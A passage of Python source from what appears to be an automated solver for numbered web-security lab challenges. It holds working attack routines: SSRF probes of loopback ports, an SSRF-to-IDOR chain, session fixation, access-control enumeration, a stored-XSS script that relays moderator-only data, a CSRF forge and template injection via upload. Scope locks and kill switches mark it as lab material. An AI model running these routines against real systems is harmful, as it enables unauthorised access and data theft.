            if k.strip().lower() not in ("disallow", "allow"):
                continue
            v = v.split("#", 1)[0].strip()
            if not v.startswith("/") or v == "/" or "*" in v or "$" in v:
                continue
            if v not in out:
                out.append(v)
        return out[:8]

    def _json_routes(self, pages):
        """Same-host paths a JSON page names as string values (a route inventory), not assets or the
        page itself, no placeholders."""
        out = []
        for pg in pages:
            doc = self.json_of(pg)
            if doc is None:
                continue
            for _k, v in self.walk_json(doc):
                if not isinstance(v, str) or len(v) > 160 or not v.startswith("/") or v.startswith("//"):
                    continue
                if any(c in v for c in " {}<>\"'\\") or _is_asset(v):
                    continue
                p = self._same_host(v, pg["path"])
                if p and p != pg["path"] and p not in out:
                    out.append(p)
        return out[:6]

    # -- the clue-field-driven GET classes (day-06 callback, day-08 session fixation) ----------------------
    def _clues(self):
        """The clue-feed inventory as a flat {field: value} of its string entries, or {} (no clue feed, not
        JSON, not an object). Only string values are kept: the clue fields name routes, a nonce and a hint."""
        return {str(k): v for k, v in self._clues_doc().items() if isinstance(v, str)}

    @staticmethod
    def _clue_route(clues, name):
        """A clue value that is a same-site absolute path (a route), else None."""
        v = clues.get(name)
        if isinstance(v, str) and _web.safe_route_path(v, max_bytes=1024):
            return v
        return None

    def _clues_dispatch(self):
        """When /api/clues names a session hint or a callback nonce, run the matching GET reader at once (the
        day-08 and day-06 classes). Returns True once a proof was read; the planting parameter and the nonce
        parameter are derived from the clue fields and this target's own bytes, never hard-coded."""
        clues = self._clues()
        if not clues:
            return False
        secondary = self._clue_route(clues, "secondary_route")
        feature = self._clue_route(clues, "feature_route")
        # the Day-24 broken-access-control field+action authz bypass (day-14): the inventory/clues advertise a
        # feature_route, a fields list, an actions list and a protected_reference; drive the ADVERTISED route
        # GET-only over fields x actions on the protected reference (the privileged combo self-proves). Tried
        # before the SSRF class because its own gate (a fields+actions inventory) is specific; a target without
        # one is left untouched.
        if feature and self._access_authz(feature, clues):
            return True
        # the Day-24 clue-driven SSRF class (day-15 fetch-quest): a feature_route that wants an absolute URL and
        # a secondary_route; send the generic SSRF param set to the FEATURE route joined with a loopback host,
        # enumerated internal ports and the secondary_route path. Gated on the feature route's own *_required
        # error asking for a URL, so a non-SSRF clue target is left untouched.
        if feature and secondary and self._ssrf_feature(feature, secondary):
            return True
        # the Day-27 clue-driven SSRF->IDOR chain (day-27 internal-affairs; B-234): a feature_route that is a GET
        # query-param SSRF sink, a topology_route naming an internal loopback case service and a
        # case_directory_route listing {id, owner}. Nest the case id of an owner != current_role inside the SSRF
        # target to read a record the caller is not authorised to see; its body carries the proof. Gated on the
        # topology/case-directory signal, so a plain feature-route target is left untouched.
        if feature and self._ssrf_idor_indicated(clues) and self._ssrf_idor_chain(feature, clues):
            return True
        # the callback class first (day-06): a nonce clue + the browser-fetch headers
        # These state-changing workflows are authorized only by the exact clue
        # contract observed for their class.  A generic csrf/oauth nonce or a
        # debug/cache hint must never be repurposed as callback/session input.
        nkey = "callback_nonce" if "callback_nonce" in clues else None
        if nkey and secondary and self._browser_callback(feature, secondary, nkey, clues[nkey]):
            return True
        # the session-fixation class (day-08): a session hint planted on the feature route, read on the status route
        hkey = "session_hint" if "session_hint" in clues else None
        if hkey and feature and secondary and self._session_fixation(feature, secondary, hkey, clues[hkey]):
            return True
        # the stored-XSS class (day-07): POST a note; the moderator browser relays the proof to the receipt route
        # (player-approved 2026-10-21, kill-switch STORED_XSS_ENABLED; crosses the GET-only rule 393).
        if STORED_XSS_ENABLED:
            mod_values = []
            for key in ("moderator_data_route", "moderator_route"):
                if key not in clues:
                    continue
                value = self._clue_route(clues, key)
                if value is None:
                    mod_values = []
                    break
                if value not in mod_values:
                    mod_values.append(value)
            mod = mod_values[0] if len(mod_values) == 1 else None
            rec_values = []
            for key in ("receipt_route_template", "receipt_route"):
                if key not in clues:
                    continue
                value = _xss_path(clues.get(key), template=True)
                if value is None:
                    rec_values = []
                    break
                if value not in rec_values:
                    rec_values.append(value)
            rec = rec_values[0] if len(rec_values) == 1 else None
            if mod and isinstance(rec, str) and rec and self._stored_xss(feature, mod, rec):
                return True
        # the CSRF cross-site forge class (day-09): DEFAULT ON by the player's 2026-10-26 authorization; kill-switch
        # CSRF_ENABLED. Keyed on a preferences_route clue (a GET form whose change the target records in
        # its own /api/<prefs> evidence field). The proof is read from the forge's effect, not the POST of a form.
        if CSRF_ENABLED:
            prefs = self._clue_route(clues, "preferences_route")
            if prefs and self._csrf(feature, prefs):
                return True
        # the upload->template eval class (day-10): DEFAULT ON by the player's 2026-10-26 authorization (one bounded
        # file stored in the synthetic target); kill-switch UPLOAD_ENABLED. Keyed on a render_route clue plus a
        # preview_guide. The proof is read from the render GET, never from the upload POST response.
        if UPLOAD_ENABLED:
            render = self._clue_route(clues, "render_route")
            guide = self._clue_route(clues, "preview_guide")
            raw_guide = clues.get("preview_guide")
            if raw_guide and not guide:
                return False
            if render and (guide or clues.get("upload_shape") or clues.get("upload_policy")) \
                    and self._upload_template(feature, render, guide):
                return True
        return False

    # -- the Day-24 clue-driven SSRF class (day-15 fetch-quest) ---------------------------------------------
    def _clue_route_candidates(self):
        """A common spelling of the clue feed OTHER than /api/clues, but only one the target's OWN
        openapi.json or landing page already names (a route inventory, a link, a path in its text): never a
        blind guess, so a target that names no such route costs nothing extra. Bounded to 3."""
        out = []
        for path in (self.openapi_route, self.app_root):
            pg = self._page(path) or self.fetch(path, "plain", False, "clue-doc-src:" + path)
            if not pg:
                continue
            for p in self._json_routes([pg]) + self.links(pg) + self.text_paths(pg):
                base = p.split("?", 1)[0]
                if base != self.clues_route and re.search(r"clue|hint", base, re.I) and base not in out:
                    out.append(base)
        return out[:3]

    def _clues_doc(self):
        """The raw clue-feed document (every value kept, not only strings, so an int protected_reference
        survives): `/api/clues` first (wave 1 already fetched it, so the common case costs no extra
        request), then, only when the target's own openapi.json or landing page names a differently-spelled
        clue/hint route (`_clue_route_candidates`), one more read-only GET on each of those -- never a blind
        probe of made-up spellings. {} when none of them is a JSON object (no clue feed at all)."""
        doc = self.json_of(self._page(self.clues_route)
                           or self.fetch(self.clues_route, "plain", False,
                                         "clue-doc:" + self.clues_route))
        if isinstance(doc, dict):
            return doc
        for path in self._clue_route_candidates():
            if not self.allowed(path, False, trusted=True):
                continue
            pg = self._page(path) or self.fetch(path, "plain", False, "clue-doc:" + path, trusted=True)
            doc2 = self.json_of(pg)
            if isinstance(doc2, dict):
                return doc2
        return {}

    def _ssrf_feature(self, feature, secondary):
        """day-15 fetch-quest SSRF (GET only). Send the generic SSRF param set (url first) to the FEATURE
        route, each value an internal loopback URL joined with an enumerated internal port and the
        secondary_route path (`http://127.0.0.1:<port><secondary_route>`); the internal service's own answer
        carries ok:true + the proof. The feature route is driven trusted=True (an advertised route), the
        internal URL passes inner_ok(), and the proof is banked only by the payoff/one-proof rule. Runs only
        when the feature route's own error asks for a URL, so a non-SSRF clue target (e.g. a field+action one)
        is left untouched. Returns True once a proof shows."""
        if not self.allowed(feature, False, trusted=True):
            return False
        base = feature.split("?", 1)[0]
        pg = self._page(feature) or self.fetch(feature, "ssrf", False, "ssrf-feat:" + base, trusted=True)
        err = (pg or {}).get("text") or ""
        if not _URL_REQUIRED.search(err):          # the feature route is not an absolute-URL fetcher
            return False
        sec = secondary if secondary.startswith("/") else "/" + secondary
        group = "ssrf-feature:" + base
        tries = 0
        # ``absolute_url_required`` described the VALUE contract on Day 15,
        # whose documented common field was ``url``.  Rank that simplest field
        # first, but retain the target-derived ``absolute_url`` / ``absoluteurl``
        # candidates immediately behind it: a future target may use the error
        # word literally.  Other *_required spellings keep exact-first order.
        params = clue_params("feature_route", SSRF_FEATURE_PARAMS, err)
        if re.search(r"(?i)\babsolute_?url_(?:required|missing|needed|expected)\b", err) and "url" in params:
            params = ["url"] + [name for name in params if name != "url"]
        for param in params:
            param_read = 0
            for host in ("127.0.0.1", "localhost"):
                for port in SSRF_PORTS:
                    inner = f"http://{host}:{port}{sec}"
                    if not inner_ok(inner):
                        continue
                    pg2 = self.fetch(_with_query(base, param, inner), "ssrf", True, group, trusted=True)
                    if self.done():
                        return True
                    if self._payoff_terminal():    # ambiguous/non-wire novel payoff: no later try can fix it
                        return False
                    tries += 1
                    if tries >= SSRF_FEATURE_MAX or not self._may_send():
                        return False
                    body = (pg2 or {}).get("text") or ""
                    if param_read == 0 and pg2 is not None and _URL_REQUIRED.search(body):
                        param_read = -1            # the route ignored this param: try the next param, not more ports
                        break
                    param_read = 1
                if param_read < 0:
                    break
            if param_read > 0:
                return False                       # the SSRF param was found but no internal port self-proved
        return False

    # -- the Day-27 clue-driven SSRF->IDOR chain (day-27 internal-affairs; B-234) --------------------------
    @staticmethod
    def _ssrf_idor_indicated(clues):
        """The day-27 signal in /api/clues: a topology/case-service route, a case-directory route, or a
        `service_pattern` naming a server-side case fetch. Keyed on the clue document alone (no extra wire),
        so a plain feature-route target never enters the chain."""
        if any(clues.get(key) for key in ("topology_route", "case_service_route",
                                          "case_directory_route", "cases_route")):
            return True
        pattern = str(clues.get("service_pattern") or "")
        return bool(re.search(r"(?i)\bcase\b|\binternal[_ -]?(?:case|service)\b|server-side case", pattern))

    def _ssrf_sink_param(self, page):
        """The SSRF sink's query-parameter name, from the feature route's own no-arg error. The route names
        it structurally (`query_parameter`) or in the error word (`target_required` -> `target`); default
        `target` (the observed day-27 slot). Never a guessed non-SSRF word."""
        doc = self.json_of(page)
        if isinstance(doc, dict):
            for key in ("query_parameter", "parameter", "param", "expected_parameter", "missing_parameter"):
                value = doc.get(key)
                if isinstance(value, str) and re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{0,40}", value):
                    return value
        text = (page or {}).get("text") or ""
        m = re.search(r"(?i)\b([a-z][a-z0-9_]{1,40})_(?:required|missing|needed|expected)\b", text)
        if m and m.group(1).lower() in set(SSRF_FEATURE_PARAMS):
            return m.group(1)
        return "target"

    def _internal_service_url(self, route):
        """The internal loopback base URL a topology feed hands out (day-27 `case_service`). The first string
        value in the feed that is an absolute http(s) URL passing inner_ok() (a loopback/RFC1918 host), a
        service/base/url-named key preferred. None when the feed names no internal URL."""
        if not self.allowed(route, False, trusted=True):
            return None
        pg = self._page(route) or self.fetch(route, "plain", False, "ssrf-idor-topo:" + route, trusted=True)
        doc = self.json_of(pg)
        if not isinstance(doc, dict):
            return None
        best = None
        for key, value in self.walk_json(doc):
            if not isinstance(value, str):
                continue
            url = value.strip()
            if not re.match(r"(?i)^https?://", url) or not inner_ok(url):
                continue
            rank = 0 if re.search(r"(?i)service|case|internal|loopback|base|url|endpoint|host",
                                  str(key)) else 1
            if best is None or rank < best[0]:
                best = (rank, url)
        return best[1] if best else None

    @staticmethod
    def _case_objects(doc):
        """The list of case/record objects a case-directory feed lists: a named collection
        (`cases`/`records`/...), else any list whose items are dicts carrying an owner-ish field."""
        if not isinstance(doc, dict):
            return []
        for key in ("cases", "records", "objects", "items", "entries", "results", "data"):
            value = doc.get(key)
            if isinstance(value, list):
                objs = [o for o in value if isinstance(o, dict)]
                if objs:
                    return objs[:200]
        for value in doc.values():
            if isinstance(value, list):
                objs = [o for o in value if isinstance(o, dict)
                        and any(k in o for k in SSRF_IDOR_OWNER_KEYS)]
                if objs:
                    return objs[:200]
        return []

    def _owner_mismatch_ids(self, route, role):
        """Object ids from the case-directory feed whose owner is NOT the caller's role (the IDOR victims),
        in feed order. [] when the feed is not readable, lists no case objects, or every owner is the caller."""
        if not self.allowed(route, False, trusted=True):
            return []
        pg = self._page(route) or self.fetch(route, "plain", False, "ssrf-idor-cases:" + route, trusted=True)
        role_folded = role.strip().casefold()
        out = []
        for obj in self._case_objects(self.json_of(pg)):
            owner = None
            for key in SSRF_IDOR_OWNER_KEYS:
                value = obj.get(key)
                if isinstance(value, str) and value.strip():
                    owner = value.strip().casefold()
                    break
            if owner is None or owner == role_folded:
                continue
            oid = None
            for key in SSRF_IDOR_ID_KEYS:
                value = obj.get(key)
                if isinstance(value, bool):
                    continue
                if isinstance(value, int):
                    oid = str(value)
                    break
                if isinstance(value, str) and re.fullmatch(r"[A-Za-z0-9_-]{1,64}", value):
                    oid = value
                    break
            if oid is not None and oid not in out:
                out.append(oid)
        return out

    def _ssrf_idor_chain(self, feature, clues):
        """day-27 internal-affairs SSRF->IDOR (GET only). Parse the feature route's own no-arg error for the
        SSRF query-parameter name, the topology feed for the internal loopback case-service base URL, and the
        case directory for an object id whose owner != current_role; then GET
        `feature?<param>=<url-encoded <case-service>?id=<victim>>`. The internal service trusts whoever
        reached it, so the owner-mismatch record (the IDOR) returns the proof in its body. The feature and the
        clue-named recon routes are driven trusted=True, the inner URL passes inner_ok(), and the proof is
        banked only by the payoff/one-proof rule. Returns True once a proof shows."""
        role = clues.get("current_role")
        if not isinstance(role, str) or not role.strip():
            return False                           # no identity -> cannot pick the owner-mismatch id
        if not self.allowed(feature, False, trusted=True):
            return False
        topo_route = (self._clue_route(clues, "topology_route")
                      or self._clue_route(clues, "case_service_route") or "/api/topology")
        cases_route = (self._clue_route(clues, "case_directory_route")
                       or self._clue_route(clues, "cases_route") or "/api/cases")
        service = self._internal_service_url(topo_route)
        if not service:
            return False                           # topology named no internal URL -> not this chain
        victims = self._owner_mismatch_ids(cases_route, role)
        if not victims:
            return False                           # no cross-owner object id -> nothing to reach
        base = feature.split("?", 1)[0]
        feature_page = self._page(feature) or self.fetch(feature, "ssrf", False, "ssrf-idor:" + base,
                                                         trusted=True)
        param = self._ssrf_sink_param(feature_page)
        group = "ssrf-idor:" + base
        tries = 0
        for vid in victims[:SSRF_IDOR_VICTIMS]:
            for form in SSRF_IDOR_INNER_FORMS:
                if form == "path":
                    inner = service.split("?", 1)[0].rstrip("/") + "/" + vid
                else:
                    inner = _with_query(service, form, vid)
                if not inner_ok(inner):
                    continue
                self.fetch(_with_query(base, param, inner), "ssrf", True, group, trusted=True)
                if self.done():
                    return True
                if self._payoff_terminal():        # ambiguous/non-wire novel payoff: no later try can fix it
                    return False
                tries += 1
                if tries >= SSRF_IDOR_MAX or not self._may_send():
                    return False
        return False

    # -- the Day-24 broken-access-control field+action authz bypass (day-14 the-api-has-opinions) -----------
    def _access_authz(self, feature, clues):
        """day-14 broken access control (GET only). The /api/clues + the inventory JSON (inventory_route, else
        /api/inventory) advertise the feature route, its query parameters (an id, a fields selector, an action),
        a fields list, an actions list and a protected_reference; GET the ADVERTISED route over fields x actions
        on the protected reference. The one privileged combo returns ok:true + the proof. The advertised route is
        driven trusted=True (a destructive WORD in /execute-/process- does not refuse an advertised route), but
        no guessed path is ever trusted and an action VALUE whose word changes state is still never sent, so the
        destructive-verb guard is not relaxed. The combo is derived per variant (never hard-coded note+export).
        B-235: an action VALUE must pass the read-only allowlist (`access_action_ok`), and when neither document
        names the query parameters they are split from the bare route's own `<id>_<fields>_<action>_required`
        error (`required_params`). Kill switch: `access_authz_enabled()`. Returns True once a proof shows."""
        if not access_authz_enabled():
            return False
        doc = self._clues_doc()

        # This reader issues a privileged, payoff-eligible request.  Resolve
        # every alias family as a set rather than choosing the first key in
        # document order.  A present invalid value or two distinct normalized
        # values invalidates the whole family.
        def _aliases(src, names, normalize):
            if not isinstance(src, dict):
                return None, True, False
            values = []
            present = False
            for name in names:
                if name not in src:
                    continue
                present = True
                value = normalize(src.get(name))
                if value is None:
                    return None, False, True
                if value not in values:
                    values.append(value)
            if not present:
                return None, True, False
            return (values[0], True, True) if len(values) == 1 else (None, False, True)

        def _route(value):
            if not isinstance(value, str) or not _web.safe_route_path(value, max_bytes=1024):
                return None
            return value if self.allowed(value, False, trusted=True) else None

        def _reference(value):
            if isinstance(value, bool) or not isinstance(value, (str, int)):
                return None
            text = str(value)
            try:
                size = len(text.encode("utf-8", "strict"))
            except UnicodeEncodeError:
                return None
            if not text or size > 1024 or any(ord(c) < 0x20 for c in text):
                return None
            return text

        def _string_list(value):
            if not isinstance(value, list) or not value or len(value) > 64:
                return None
            out = []
            for item in value:
                if isinstance(item, bool) or not isinstance(item, (str, int)):
                    return None
                text = str(item)
                try:
                    size = len(text.encode("utf-8", "strict"))
                except UnicodeEncodeError:
                    return None
                if not text or size > 256 or any(ord(c) < 0x20 for c in text):
                    return None
                out.append(text)
            return tuple(out)

        feature_doc, ok, feature_present = _aliases(doc, ("feature_route",), _route)
        if not ok or not feature_present or feature_doc != feature:
            return False

        inv_route, ok, inv_route_present = _aliases(
            doc, ("inventory_route", "inventory"), _route)
        if not ok:
            return False
        inv = None
        if inv_route_present:
            # An explicit link is authority.  A malformed/refused response may
            # not silently fall back to a different cached document.
            page = self.fetch(inv_route, "access", False, "access-inv:" + inv_route, trusted=True)
            inv = self.json_of(page)
            if not isinstance(inv, dict):
                return False
        else:
            inv = self.json_of(self._page(self.app_prefix + "api/inventory"))
            if not isinstance(inv, dict):
                inv = None

        # When an inventory exists it is the single operational contract: its
        # route, field set, action set and parameter names must all be present.
        # The clue document may repeat those facts only with exact normalized
        # agreement.  Without an inventory, the clue document must carry the
        # complete contract itself.  Never fill a partial inventory with clue
        # siblings (or vice versa).
        inv_feature, inv_feature_ok, inv_feature_present = _aliases(inv, ("route",), _route)
        if not inv_feature_ok or (inv_feature_present and inv_feature != feature_doc):
            return False
        if inv is not None and not inv_feature_present:
            return False

        families = {}
        params_from_error = False
        for label, names in (
                ("fields", ("fields",)),
                ("actions", ("actions",)),
                ("params", ("query_parameters", "query_params", "parameters"))):
            doc_value, doc_ok, doc_present = _aliases(doc, names, _string_list)
            inv_value, inv_ok, inv_present = _aliases(inv, names, _string_list)
            if not doc_ok or not inv_ok:
                return False
            if doc_present and inv_present and doc_value != inv_value:
                return False
            if label == "params" and not doc_present and not inv_present:
                # Neither document names the parameters: the route's own error names them (below).
                params_from_error = True
                continue
            if inv is not None:
                if not inv_present:
                    return False
                families[label] = inv_value
            else:
                if not doc_present:
                    return False
                families[label] = doc_value

        fields = list(families["fields"])
        actions = []
        for a in families["actions"]:
            if access_action_ok(a):
                actions.append(a)
            else:
                self.refused.append("access-action:" + str(a)[:120])
        if not fields or not actions:
            return False

        ref_names = ("protected_reference", "protected_ref", "protected_id", "protectedReference")
        doc_ref, doc_ref_ok, doc_ref_present = _aliases(doc, ref_names, _reference)
        inv_ref, inv_ref_ok, inv_ref_present = _aliases(inv, ref_names, _reference)
        if not doc_ref_ok or not inv_ref_ok:
            return False
        if doc_ref_present and inv_ref_present and doc_ref != inv_ref:
            return False
        if not doc_ref_present and not inv_ref_present:
            return False
        ref = doc_ref if doc_ref_present else inv_ref

        route = inv_feature if inv_feature_present else feature_doc
        base = route.split("?", 1)[0]
        if params_from_error:
            # One plain (non-payoff) GET of the advertised route with no query: its 400 error token
            # (`id_fields_action_required`) names the three parameters. Split it; never use it whole.
            probe = self.fetch(base, "access", False, "access-params:" + base, tag="access-params",
                               trusted=True)
            qp = list(required_params((probe or {}).get("text", "") if probe else ""))
            if len(qp) != 3:                      # exactly the id, fields and action roles, nothing left over
                return False
        else:
            qp = list(families["params"])
        id_names = [p for p in qp if "id" in p.lower()]
        field_names = [p for p in qp if "field" in p.lower()]
        action_names = [p for p in qp if "action" in p.lower()]
        if not (len(id_names) == len(field_names) == len(action_names) == 1):
            return False
        id_p, fld_p, act_p = id_names[0], field_names[0], action_names[0]
        if len({id_p, fld_p, act_p}) != 3:
            return False

        group = "access:" + base
        for f in fields[:ACCESS_FIELDS_MAX]:
            for a in actions[:ACCESS_ACTIONS_MAX]:
                q = _with_query(_with_query(_with_query(base, id_p, ref), fld_p, f), act_p, a)
                self.fetch(q, "access", True, group, trusted=True)
                if self.done():
                    return True
                if self._payoff_terminal():        # ambiguous/non-wire novel payoff: no later combo can fix it
                    return False
                if not self._may_send():
                    return False
        return False

    def _origin(self):
        return self.url.rstrip("/")

    def _browser_callback(self, feature, secondary, nonce_key, nonce):
        """day-06: GET `secondary?<param>=<nonce>` with the headers a same-origin browser fetch() sends from the
        feature page. The 403-gated callback returns the proof; a plain request is refused, so this GET is the
        one payoff. Returns True once a proof shows."""
        if not (isinstance(nonce, str) and nonce):
            return False
        headers = dict(BROWSER_FETCH_HEADERS)
        headers["Origin"] = self._origin()
        headers["Referer"] = self._origin() + (feature or "/") + "?q=x"
        group = "callback:" + secondary
        for i, param in enumerate(clue_params(nonce_key, NONCE_PARAMS)):
            path = _with_query(secondary, param, nonce)
            self.fetch(path, "callback", True, group, tag=f"cb{i}", headers=headers, trusted=True)
            if self.done():
                return True
            if self._payoff_terminal():         # ambiguous/non-wire novel payoff: no later try can fix it
                return False
        return False

    def _session_fixation(self, feature, secondary, hint_key, hint):
        """day-08: plant the attacker-chosen session id (the `session_hint`) on the feature route via GET, then
        GET the status route on the same cookie jar. The status route returns the proof once the planted session
        is bound to a privileged identity. The planting parameter is derived (clue stem, the feature route's own
        error word, a short known list). Returns True once a proof shows."""
        if not (isinstance(hint, str) and hint):
            return False
        probe = self.fetch(feature, "sessionfix", False, "sessionfix-probe:" + feature, tag="sfprobe", trusted=True)
        err = (probe or {}).get("text", "") if probe else ""
        group = "sessionfix:" + secondary
        for i, param in enumerate(clue_params(hint_key, SESSION_PARAMS, err)):
            # plant: the Set-Cookie the WebClient's jar keeps carries to the status GET (a plain step, no payoff)
            self.fetch(_with_query(feature, param, hint), "sessionfix", False, group, tag=f"plant{i}", trusted=True)
            # read the privileged effect on the status route -- the proof's one payoff
            self.fetch(secondary, "sessionfix", True, group, tag=f"status{i}", trusted=True)
            if self.done():
                return True
            if self._payoff_terminal():
                return False
        return False

    def _post(self, path, body, headers, group):
        """Send ONE POST on the in-scope target (the WebClient scope lock keeps it own-host). A proof in the POST
        RESPONSE is a DECOY: it goes to self.plain/self.seen, never self.payoff, because the stored-XSS proof is
        banked only from a later GET of the note page. Returns the response dict or None; never raises."""
        path = _stateful_path(path)
        if self.client is None or path is None:
            if path is None:
                self.refused.append("stateful-post-route")
            return None
        with self.lock:
            if not self._may_send():
                return None
            if not self._reserve_send():
                return None
            self.requests += 1
        try:
            left = self._left()
            self.client.timeout = REQUEST_TIMEOUT if left is None else max(0.2, min(REQUEST_TIMEOUT, left - 0.1))
            if not self._reserved_send_still_allowed():
                return None
            try:
                r = self.client.request("POST", path, data=body, headers=dict(headers) if headers else None,
                                        allow_redirects=False)
            except Exception:
                return None
        finally:
            self._release_send()
        rb = r.get("body")
        text = bytes(rb).decode("utf-8", "replace") if isinstance(rb, (bytes, bytearray)) else str(rb or "")
        with self.lock:
            for p in scan_for_baseline_proofs(text, self.host):  # POST response is a decoy, never banked
                self.seen.setdefault(p, []).append((path.split("?", 1)[0], "storedxss-post"))
                self.plain.add(p)
        r["text"] = text                                 # so json_of(r) can read the note id (it keys on "text")
        return r

    def _xss_submit_route(self, feature):
        """The POST submit route, derived from the target's own spec: a note/message-like POST path /openapi.json
        names, else /api + feature_route, else feature_route. Never hard-coded. A generic or destructive POST
        operation is not authority to store executable content."""
        spec = self.json_of(self._page(self.openapi_route))
        paths = spec.get("paths") if isinstance(spec, dict) else None
        if isinstance(paths, dict):
            cands = [p for p, m in paths.items()
                     if _xss_path(p) and _NOTE_LIKE.search(p) and not _XSS_FATAL_PATH.search(p)
                     and isinstance(m, dict) and "post" in {str(k).lower() for k in m}]
            cands.sort(key=len)
            if len(cands) == 1:
                return cands[0]
            if len(cands) > 1:
                return None
        if isinstance(feature, str):
            candidate = feature if feature.startswith("/api") else "/api" + feature
            if _xss_path(candidate) and _NOTE_LIKE.search(candidate) and not _XSS_FATAL_PATH.search(candidate):
                return candidate
        return None

    def _stored_xss(self, feature, moderator_route, receipt_template):
        """day-07 stored XSS (POST; player-approved 2026-10-21, kill-switch STORED_XSS_ENABLED). Store a note whose
        script makes the moderator browser fetch the moderator-only data route and relay it to the receipt route;
        then GET the note page for the proof. ONE POST, own-host only (the WebClient scope lock), and the proof is
        banked ONLY from the follow-up GET -- a proof in the POST response is a decoy. The payload mirrors the
        day-07 solve exactly; route and parameter names come from /api/clues and /openapi.json, never hard-coded."""
        if not STORED_XSS_ENABLED:
            return False
        moderator_route = _xss_path(moderator_route)
        receipt_template = _xss_path(receipt_template, template=True)
        if not moderator_route or not receipt_template:
            return False
        rec_before, rec_after = receipt_template.split("{id}", 1)
        rec_expr = (json.dumps(rec_before, separators=(",", ":")) + "+encodeURIComponent(i)+" +
                    json.dumps(rec_after, separators=(",", ":")))
        js = ("var i=location.pathname.split('/').pop();fetch(%s,{credentials:'include'}).then(r=>r.text())"
              ".then(t=>fetch(%s,{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},"
              "body:JSON.stringify({evidence:t,data:t,content:t,receipt:t})}))" %
              (json.dumps(moderator_route, separators=(",", ":")), rec_expr))
        payload = "<script>%s</script><img src=x onerror=\"%s\">" % (js, js)
        submit = self._xss_submit_route(feature)
        if not submit:
            return False
        r = self._post(submit, json.dumps({"name": "n", "message": payload}),
                       {"Content-Type": "application/json"}, "storedxss:" + submit)
        if not r:
            return False
        doc = self.json_of(r)
        if not isinstance(doc, dict):
            return False
        note = doc.get("url")
        safe_feature = _xss_path(feature)
        if not note and doc.get("id") is not None and safe_feature:
            note = safe_feature.rstrip("/") + "/" + urllib.parse.quote(str(doc.get("id")), safe="")
        note = self._same_host(note, submit) if note else None
        if not note:
            return False
        group = "storedxss:" + submit
        for _ in range(STORED_XSS_POLLS):
            self.fetch(note, "storedxss", True, group, trusted=True)   # the GET is the one payoff
            if self.done():
                return True
            if self._payoff_terminal():
                return False                    # a non-decoy proof-like value elsewhere: no later poll helps
            if not self._may_send():
                return False
            time.sleep(STORED_XSS_POLL_GAP)
        return False

    # -- the Day 22 state-changing classes (day-09 CSRF forge, day-10 upload->template); bounded/default-on -------
    def _csrf(self, feature, prefs_route):
        """day-09 CSRF cross-site forge (GET only; bounded/default-on, kill-switch CSRF_ENABLED). GET the form at
        `prefs_route`, scrape its action (authoritative over the clue's feature_route -- day-09 mastery used
        /dispatch-, not /submit-), its csrf_token and its destination options; send ONE cross-site GET to that
        action changing the destination to the EXTERNAL mailbox (CROSS_SITE_HEADERS); read the proof from
        GET /api/<prefs> (the target's own recorded state). The pre-forge /api/<prefs> read is a non-payoff
        CONTROL: a proof shown there, without the forge, is a decoy (self.plain), so answer() stays None. The
        forge reaches ONLY the in-scope host; the foreign Origin/Referer are headers, not a cross-origin fetch.
        Returns True once a proof shows. Each /api/<prefs> read uses a distinct tag so it is a fresh request."""
        if not CSRF_ENABLED or not prefs_route:
            return False
        prefs_route = _stateful_path(prefs_route)
        feature = _stateful_path(feature)
        if not prefs_route or not feature:
            return False
        pref = self.fetch(prefs_route, "csrf", False, "csrf-pref:" + prefs_route, trusted=True)
        pb = (pref or {}).get("text") or ""
        forms = self.forms(pref) if pref else []
        # Exactly one GET form is authority. Choosing the first of two actions,
        # or combining a token/option from sibling forms, would let document
        # order manufacture a transition contract.
        raw_get_forms = []
        for match in _FORM.finditer(pb[:400_000]):
            attrs = _attrs(match.group(1))
            if (attrs.get("method") or "GET").upper() == "GET":
                raw_get_forms.append((attrs, match.group(2)))
        eligible_forms = [f for f in forms if f["method"] == "GET" and f["action"]]
        if len(raw_get_forms) != 1 or len(eligible_forms) != 1:
            return False
        raw_get_form, form_body = raw_get_forms[0]
        form = eligible_forms[0]
        raw_action = raw_get_form.get("action") or prefs_route
        normalized_action = self._same_host(raw_action, prefs_route)
        action = _stateful_path(normalized_action)
        if not action or form.get("stateful_action") != normalized_action:
            return False
        mt = (re.search(r"""(?is)name=['"]?csrf_token['"]?[^>]{0,200}?\bvalue\s*=\s*['"]([^'"]+)['"]""", form_body)
              or re.search(r"""(?is)\bvalue\s*=\s*['"]([^'"]+)['"][^>]{0,200}?name=['"]?csrf_token""", form_body))
        token = mt.group(1) if mt else None
        field = next((item[0] for item in form["fields"] if "dest" in item[0].lower()), None) or "destination"
        opts = re.findall(r"""(?is)<option[^>]*\bvalue\s*=\s*['"]?([^'">\s]+)""", form_body)
        ext = next((o for o in opts if any(w in o.lower() for w in ("@", "outside", "invalid", "example"))), None)
        if ext is None:
            ext = next((o for o in opts if o.lower() != "daily"), None)
        if ext is None:
            return False
        status_route = prefs_route if prefs_route.startswith("/api") else "/api" + prefs_route
        group = "csrf:" + action
        # the pre-forge control (non-payoff): evidence is null until the forge; a proof here is shown regardless
        self.fetch(status_route, "csrf", False, group, tag="pre", trusted=True)
        # the forge: ONE cross-site GET that changes the destination to the external mailbox (a payoff)
        q = _with_query(action, field, ext)
        if token:
            q = _with_query(q, "csrf_token", token)
        self.fetch(q, "csrf", True, group, offered=False, headers=CROSS_SITE_HEADERS, tag="forge", trusted=True)
        # the proof is recorded in the status route's own evidence after the forge (the payoff read)
        self.fetch(status_route, "csrf", True, group, tag="post", trusted=True)
        return self.done()

    def _upload_template(self, feature, render, preview_guide):
        """day-10 upload -> HTML/template evaluation (one POST + GETs; bounded/default-on, kill switch).
        Read the objective field name from `preview_guide` (default 'objective'); upload "{{<field>}}" under a
        filename ending LOWERCASE '.html' (the trigger; content_type is ignored) and GET the render route for the
        proof. The honest CONTROL is the SAME content under a '.txt' name: it renders the literal braces, so it is
        a non-payoff -- a proof that shows for the '.txt' too is a decoy, not a genuine render payoff (answer()
        stays None). The proof is banked only from the render GET; a proof in the upload POST response is a decoy
        (_post marks it plain). Returns True once a proof shows."""
        if not UPLOAD_ENABLED or not feature or not render:
            return False
        feature = _stateful_path(feature)
        render = _stateful_path(render)
        safe_guide = _stateful_path(preview_guide) if preview_guide else None
        if not feature or not render or (preview_guide and not safe_guide):
            return False
        field = "objective"
        guide = self.fetch(safe_guide, "upload", False, "upload-guide", trusted=True) if safe_guide else None
        gt = (guide or {}).get("text") or ""
